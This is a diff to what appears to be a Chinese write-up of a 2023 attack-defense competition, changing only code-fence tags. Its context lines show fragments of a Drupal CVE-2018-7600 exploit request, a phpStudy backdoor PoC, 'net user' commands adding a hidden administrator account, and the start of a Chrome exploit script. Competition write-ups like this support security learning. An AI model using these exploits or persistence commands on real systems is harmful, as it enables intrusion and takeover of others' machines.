@@ -23,7 +23,7 @@ slug: "dfjkfinal-2023-su-wu"
 
 ### 1、招聘网站173.20.1.94 
 因为开场题目只给了这个ip，所以大家都在打这个，这个招聘网站是直接打的drupal远程代码执行 (CVE-2018-7600),在vulhub上有直接的exp
-```
+```http
 POST /user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax HTTP/1.1
 Host: your-ip:8080
 Accept-Encoding: gzip, deflate
@@ -40,7 +40,7 @@ form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=
 
 ### 2、门户网站 173.20.1.53
 这就很奇怪了，主办方没给公告之前扫了很多次没东西，发了公告后直接扫描到了这个网站，而且给了phpinfo，phpinfo提供了php版本是 5.4.45,存在phpstudy的后门漏洞，poc直接打。
-```
+```http
 GET / HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0
@@ -54,7 +54,7 @@ Cache-Control: max-age=0
 Content-Length: 2
 ```
 这个是windows写马挺怪的，花了一些时间上去，发现是高权限用户，命令执行增加用户
-```
+```bash
 net user dddd123 dddqwe@!@# /add
 net localgroup administrators dddd123 /add 
 ```
@@ -66,7 +66,7 @@ net localgroup administrators dddd123 /add
 刚好是2021年爆出来的chrome 0day rce版本。
 
 中途大概就两三个队打了，主办方考虑到大家没啥环境，就给了cs4.2版本。最良心的是把exp也给了，再到最后直接给了word说明文档
-```
+```javascript
 <script>
    function gc() {
        for (var i = 0; i < 0x80000; ++i) {
